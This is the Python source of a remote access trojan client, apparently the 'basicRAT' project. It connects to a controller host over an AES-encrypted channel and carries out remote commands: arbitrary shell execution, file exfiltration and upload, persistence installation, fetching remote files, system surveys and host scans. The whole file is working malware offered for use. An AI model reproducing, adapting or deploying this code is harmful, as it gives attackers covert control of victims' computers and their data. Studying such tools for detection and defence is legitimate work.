#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys
import base64

from core import common
from core import crypto
from core import filesock
from core import persistence
from core import scan
from core import survey
from core import toolkit


PLAT_TYPE = sys.platform
HOST      = 'localhost'
PORT      = 1337
FB_KEY    = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def send_message(message, sock, dh_key):
    message = base64.b64encode(message)
    enc_message = crypto.AES_encrypt(message, dh_key)
    sock.send(struct.pack('>I', len(enc_message)) + enc_message)


def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    dh_key = crypto.diffiehellman(s)
    s.setblocking(0)
    try:
        while True:
            try:
                msglen = struct.unpack('>I', s.recv(4))[0]
            except Exception:
                continue
            data = s.recv(msglen)
            data = base64.b64decode(crypto.AES_decrypt(data, dh_key))

            # seperate prompt into command and action
            cmd, _, action = data.partition(' ')

            # stop client
            if cmd == 'terminate':
                s.close()
                sys.exit(0)

            # run command
            elif cmd == 'run':
                results = subprocess.Popen(action, shell=True,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          stdin=subprocess.PIPE)
                results = results.stdout.read() + results.stderr.read()
                send_message(results, s, dh_key)

            # send file
            elif cmd == 'download':
                for fname in action.split():
                    fname = fname.strip()
                    send_message("download %s" % fname, s, dh_key)
                    filesock.sendfile(s, fname, dh_key)

            # receive file
            elif cmd == 'upload':
                for fname in action.split():
                    fname = fname.strip()
                    filesock.recvfile(s, fname, dh_key)

            # regenerate DH key
            elif cmd == 'rekey':
                send_message("rekey", s, dh_key)
                dh_key = crypto.diffiehellman(s)

            # apply persistence mechanism
            elif cmd == 'persistence':
                results = persistence.run(PLAT_TYPE)
                send_message(results, s, dh_key)

            # download a file from the web
            elif cmd == 'wget':
                results = toolkit.wget(action)
                send_message(results, s, dh_key)

            # unzip a file
            elif cmd == 'unzip':
                results = toolkit.unzip(action)
                send_message(results, s, dh_key)

            # run system survey
            elif cmd == 'survey':
                results = survey.run(PLAT_TYPE)
                send_message(results, s, dh_key)

            # run a scan
            elif cmd == 'scan':
                results = scan.single_host(action)
                send_message(results, s, dh_key)

    except KeyboardInterrupt:
        s.close()

if __name__ == '__main__':
    main()
